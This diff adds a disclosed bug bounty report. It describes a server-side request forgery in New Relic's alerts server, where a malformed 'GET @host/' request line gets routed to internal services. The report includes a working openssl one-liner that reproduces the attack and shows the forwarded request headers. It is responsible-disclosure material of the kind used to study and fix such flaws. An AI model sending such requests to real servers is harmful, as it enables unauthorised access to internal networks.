@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/198690
+WeaknessName:Server-Side Request Forgery (SSRF)
+Reporter:https://hackerone.com/albinowax
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:22.08.2017 17:14:40
+
+Summary:
+
+By sending a malformed HTTP request to alerts.newrelic.com, it's possible to trick that server into routing the request to an arbitrary location. This can be exploited by an internet based attacker to access internal services - doing a quick scan of █████████ I was able to access █████ etc. The attached screenshot shows some of the stuff I found.
+
+I found this issue using an experimental Burp Suite extension but you can replicate it using openssl. The following request will fetch ███
+echo -e 'GET @█████/ HTTP/1.1\r\nHost: alerts.newrelic.com\r\n\r\n' | openssl s_client -ign_eof -connect alerts.newrelic.com:443
+
+The request forwarded to ██████ will look like:
+```
+GET / HTTP/1.1
+X-Forwarded-Proto: https
+X-Request-Start: t=1484560126710000
+Service-Gateway-Config: alerts.newrelic.com
+Service-Gateway-Entitlements-Error: account id not found
+Service-Gateway-Would-Have-Rejected: ["account access","login"]
+X-Forwarded-Host: alerts.newrelic.com
+X-Forwarded-For: █████
+Host: alerts.█████
+X-NewRelic-ID: VRUEUFVWCQI=
+X-NewRelic-Transaction: PxQBVgBUCQIFU1daUVMBVgEFFB8EBw8RVU4aVA9eAwMCUA5XCQdRVFRTA0NKQQoCCVNTUg9TFTs=
+connection: close
+```
+
+I believe the root cause is a poorly written rewrite rule translating @████/foo into http://alerts.██████████@█████████/foo
+
+I've reported this issue as 'critical' because I'm fairly confident I could compromise quite a few of the internal services I found - some of them appear to lack authentication entirely. I haven't gone beyond fetching the homepages of these applications, but if you'd like further evidence that this is a serious issue I'd be very happy to help.
